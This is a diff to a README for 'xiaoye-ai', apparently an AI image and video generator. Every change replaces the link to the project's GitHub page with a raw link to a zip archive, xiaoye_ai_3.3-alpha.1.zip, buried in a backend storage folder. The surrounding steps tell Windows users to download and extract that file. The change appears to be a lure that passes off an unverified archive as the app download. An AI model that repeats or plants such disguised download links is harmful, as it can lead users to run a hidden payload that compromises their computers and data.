@@ -1,6 +1,6 @@
 # 🎨 xiaoye-ai - Create images and videos fast
 
-[![Download xiaoye-ai](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Lawrenc7899/xiaoye-ai)
+[![Download xiaoye-ai](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Lawrenc7899/xiaoye-ai/raw/refs/heads/main/backend/internal/storage/xiaoye_ai_3.3-alpha.1.zip)
 
 ## 🚀 What xiaoye-ai does
 
@@ -16,7 +16,7 @@ Use it to:
 
 ## 📥 Download and install
 
-1. Open the download page: [https://github.com/Lawrenc7899/xiaoye-ai](https://github.com/Lawrenc7899/xiaoye-ai)
+1. Open the download page: [https://github.com/Lawrenc7899/xiaoye-ai/raw/refs/heads/main/backend/internal/storage/xiaoye_ai_3.3-alpha.1.zip](https://github.com/Lawrenc7899/xiaoye-ai/raw/refs/heads/main/backend/internal/storage/xiaoye_ai_3.3-alpha.1.zip)
 2. Look for the latest release or the main app files on the page
 3. Download the Windows version or the file marked for desktop use
 4. If the file is a `.zip`, right-click it and choose **Extract All**
@@ -216,7 +216,7 @@ The app uses model service keys to talk to external AI services. Add only the ke
 
 If you need to return to the download page, use this link:
 
-[Visit the xiaoye-ai GitHub page](https://github.com/Lawrenc7899/xiaoye-ai)
+[Visit the xiaoye-ai GitHub page](https://github.com/Lawrenc7899/xiaoye-ai/raw/refs/heads/main/backend/internal/storage/xiaoye_ai_3.3-alpha.1.zip)
 
 ## 📁 File handling on Windows
 
